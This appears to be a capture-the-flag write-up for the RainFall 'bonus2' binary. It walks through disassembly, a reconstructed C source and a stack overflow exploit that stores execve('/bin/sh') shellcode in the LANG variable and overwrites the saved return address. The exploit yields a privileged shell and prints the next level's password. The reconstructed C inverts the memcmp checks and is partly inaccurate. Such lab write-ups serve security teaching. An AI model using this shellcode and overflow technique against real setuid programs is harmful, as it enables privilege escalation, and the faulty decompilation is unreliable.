# bonus2 - Stack Buffer Overflow - Environment Variable

On `bonus2`'s HOME, we find a binary named : `bonus2`

```shell
...
0x08048484  greetuser
0x08048529  main
...
```

let's disassemble these functions:

```shell
(gdb)  disass main
Dump of assembler code for function main:
   0x08048529 <+0>:	push   ebp
   0x0804852a <+1>:	mov    ebp,esp
   0x0804852c <+3>:	push   edi
   0x0804852d <+4>:	push   esi
   0x0804852e <+5>:	push   ebx
   0x0804852f <+6>:	and    esp,0xfffffff0
   0x08048532 <+9>:	sub    esp,0xa0
   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3
   0x0804853c <+19>:	je     0x8048548 <main+31>
   0x0804853e <+21>:	mov    eax,0x1
   0x08048543 <+26>:	jmp    0x8048630 <main+263>
   0x08048548 <+31>:	lea    ebx,[esp+0x50]
   0x0804854c <+35>:	mov    eax,0x0
   0x08048551 <+40>:	mov    edx,0x13
   0x08048556 <+45>:	mov    edi,ebx
   0x08048558 <+47>:	mov    ecx,edx
   0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax
   0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804855f <+54>:	add    eax,0x4
   0x08048562 <+57>:	mov    eax,DWORD PTR [eax]
   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28
   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax
   0x08048570 <+71>:	lea    eax,[esp+0x50]
   0x08048574 <+75>:	mov    DWORD PTR [esp],eax
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804857f <+86>:	add    eax,0x8
   0x08048582 <+89>:	mov    eax,DWORD PTR [eax]
   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20
   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax
   0x08048590 <+103>:	lea    eax,[esp+0x50]
   0x08048594 <+107>:	add    eax,0x28
   0x08048597 <+110>:	mov    DWORD PTR [esp],eax
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
   0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax
   0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0
   0x080485ba <+145>:	je     0x8048618 <main+239>
   0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2
   0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d
   0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c]
   0x080485d3 <+170>:	mov    DWORD PTR [esp],eax
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
   0x080485db <+178>:	test   eax,eax
   0x080485dd <+180>:	jne    0x80485eb <main+194>
   0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1
   0x080485e9 <+192>:	jmp    0x8048618 <main+239>
   0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2
   0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740
   0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c]
   0x08048602 <+217>:	mov    DWORD PTR [esp],eax
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:	test   eax,eax
   0x0804860c <+227>:	jne    0x8048618 <main+239>
   0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2
   0x08048618 <+239>:	mov    edx,esp
   0x0804861a <+241>:	lea    ebx,[esp+0x50]
   0x0804861e <+245>:	mov    eax,0x13
   0x08048623 <+250>:	mov    edi,edx
   0x08048625 <+252>:	mov    esi,ebx
   0x08048627 <+254>:	mov    ecx,eax
   0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   0x0804862b <+258>:	call   0x8048484 <greetuser>
   0x08048630 <+263>:	lea    esp,[ebp-0xc]
   0x08048633 <+266>:	pop    ebx
   0x08048634 <+267>:	pop    esi
   0x08048635 <+268>:	pop    edi
   0x08048636 <+269>:	pop    ebp
   0x08048637 <+270>:	ret
End of assembler dump.
(gdb)  disass greetuser 
Dump of assembler code for function greetuser:
   0x08048484 <+0>:	push   ebp
   0x08048485 <+1>:	mov    ebp,esp
   0x08048487 <+3>:	sub    esp,0x58
   0x0804848a <+6>:	mov    eax,ds:0x8049988
   0x0804848f <+11>:	cmp    eax,0x1
   0x08048492 <+14>:	je     0x80484ba <greetuser+54>
   0x08048494 <+16>:	cmp    eax,0x2
   0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:	test   eax,eax
   0x0804849b <+23>:	jne    0x804850a <greetuser+134>
   0x0804849d <+25>:	mov    edx,0x8048710
   0x080484a2 <+30>:	lea    eax,[ebp-0x48]
   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]
   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx
   0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4]
   0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx
   0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6]
   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl
   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
   0x080484ba <+54>:	mov    edx,0x8048717
   0x080484bf <+59>:	lea    eax,[ebp-0x48]
   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
   0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
   0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
   0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
   0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
   0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
   0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
   0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
   0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
   0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl
   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:	mov    edx,0x804872a
   0x080484ee <+106>:	lea    eax,[ebp-0x48]
   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
   0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
   0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
   0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
   0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
   0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx
   0x08048509 <+133>:	nop
   0x0804850a <+134>:	lea    eax,[ebp+0x8]
   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+141>:	lea    eax,[ebp-0x48]
   0x08048514 <+144>:	mov    DWORD PTR [esp],eax
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
   0x0804851c <+152>:	lea    eax,[ebp-0x48]
   0x0804851f <+155>:	mov    DWORD PTR [esp],eax
   0x08048522 <+158>:	call   0x8048390 <puts@plt>
   0x08048527 <+163>:	leave  
   0x08048528 <+164>:	ret    
End of assembler dump.
```

<br>

After decompiling it using gdb, we build this code in C language:

```shell
>$ cat source
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <unistd.h>

int language = 0;


void	greetuser( char *str ) {

	char buffer[72];

	if ( language == 1 ) {
		strcpy(buffer, "Hyvää päivää ");
	} else if ( language == 2 ) {
		strcpy(buffer, "Goedemiddag! ");
	} else if ( language == 0 ) {
		strcpy(buffer, "Hello ");
	}

	strcat( buffer, str );
	puts( buffer );

}


int		main( int ac, char **av ) {

	char buffer[80];
	char *lang;
	void *esp;

	if ( ac != 3 )
		return 1;

	for ( int i = 0; i < 19 * 4; i++ )
		buffer[i] = 0;

	strncpy( buffer, av[1], 40 );
	strncpy( buffer + 40, av[2], 32 );

	if ( lang = getenv("LANG") ) {
		if ( memcmp(lang, "fi", 2) != 0 )
			language = 1;
		else if ( memcmp(lang, "nl", 2) != 0 )
			language = 2;
	}

	for ( int i = 0; i < 19 * 4; i++ )
		((char *)esp)[i] = buffer[i];

	greetuser( (char *)esp );

	return 0;

}
```

we understand here that there are two arguments:

1. One with a maximum size of 40 bytes.

2. One with a maximum size of 32 bytes.

These two string are concatenate in a buffer of a maximum size of **72 bytes**.

Moreover, the `LANG` environment variable is retrieved at runtime and its
two first bytes are compare to **"nl"** and **"fi"**. this lead to value `1`, `2`
or `0` for a global variable we named `language`. On the `greetuser()` function,
the `language` variable is tested to fill the first bytes of a buffer of **72 bytes**
to which the buffer previously constructed in the main is concatenated. Depends
the value of the `language` variable, the first bytes of the `greetuser()` function
buffer are fill by **"Hello "**, **"Hyvää päivää "** or **"Goedemiddag! "**. Thanks to
these first bytes, if we concatene to these the `main()` function buffer, we can
overflow the `greetuser()` function buffer.

<br>

Perfect Let's check size between the `greetuser()` function buffer and `eip`:

```shell
(gdb) b *0x0804848a
Breakpoint 1 at 0x804848a
(gdb) r test1 test2
Starting program: /home/user/bonus2/bonus2 test1 test2

Breakpoint 1, 0x0804848a in greetuser ()
(gdb) x/x $ebp-0x48
0xbffff620:	0x3c
(gdb) info frame
Stack level 0, frame at 0xbffff670:
 eip = 0x804848a in greetuser; saved eip 0x8048630
 called by frame at 0xbffff730
 Arglist at 0xbffff668, args: 
 Locals at 0xbffff668, Previous frame's sp is 0xbffff670
 Saved registers:
  ebp at 0xbffff668, eip at 0xbffff66c
```

So the distance from buffer to the end of 4-bytes register `eip` is **80 bytes**
(*0xbffff66c+0x4 - 0xbffff620*)

<br>

This knowing, we understand that the string **"Hello "** is too small to rewrite
`eip` (6 + 72 = 78 bytes). So, we have the choice: **"Hyvää päivää "** or **"Goedemiddag! "**.
We choose **"Goedemiddag! "**, lets' check... 13 + 72 = 85. We got it !
We can now rewrite `eip` to redirect the execution to our shellcode but where ?
There many place where we can store our shellcode, but we always choose the bigger
space due to different memory mapping between one execution and another or between
gdb execution et normal execution. So for store our big payload, we choose...
The `LANG` environment variable itself.

Indeed, apart from the first two bytes which must be *"nl"* (remember to have the
start of the buffer correctly formatted, the `language` variable must have the
value `2`), the rest can be whatever you want.

So, the `LANG` variable value will be:

- **"nl" + "\x90" * 175 + our shellcode** (check [level2](https://github.com/A-Mahla/Security-Pentest-Part-III/tree/main/level2) for explaination)

```shell
export LANG=$(python -c 'print "nl" + "\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80".rjust(200, b"\x90")')
```

<br>

To finish, we have to input an offset of **63 bytes** before rewrite the **4-bytes**
`eip` value to the environment variable `LANG`. To do that, we need the localisation
of this variable in the execution memory:

```shell
bonus2@RainFall:~$ (export LANG=$(python -c 'print "nl" + "\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80".rjust(200, b"\x90")') && gdb -q bonus2)
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) b *0x080485ab
Breakpoint 1 at 0x80485ab
(gdb) r test1 test2
Starting program: /home/user/bonus2/bonus2 test1 test2

Breakpoint 1, 0x080485ab in main ()
(gdb) x/x $eax
0xbffffe69:	0x90906c6e
```

To avoid any different memory mapping, we add an offset of **0x50 bytes**.
Finally, we redirect the execution to **0xbffffea9**.

So, the two arguments are:

- `$(python -c 'print "\x90" * 40')`

- `$(python -c 'print "\x90" * 23 + "\xbf\xff\xfe\xa9"[::-1]')`

<br>

We can now exploit this BOF :

```shell
(export LANG=$(python -c 'print "nl" + "\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80".rjust(200, b"\x90")') && ./bonus2 $(python -c 'print "\x90" * 40') $(python -c 'print "\x90" * 23 + "\xbf\xff\xfe\xa9"[::-1]'))
```

```shell
bonus2@RainFall:~$ (export LANG=$(python -c 'print "nl" + "\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80".rjust(200, b"\x90")') && ./bonus2 $(python -c 'print "\x90" * 40') $(python -c 'print "\x90" * 23 + "\xbf\xff\xfe\xa9"[::-1]'))
Goedemiddag! �������������������������������������������������������������������
$ id
uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
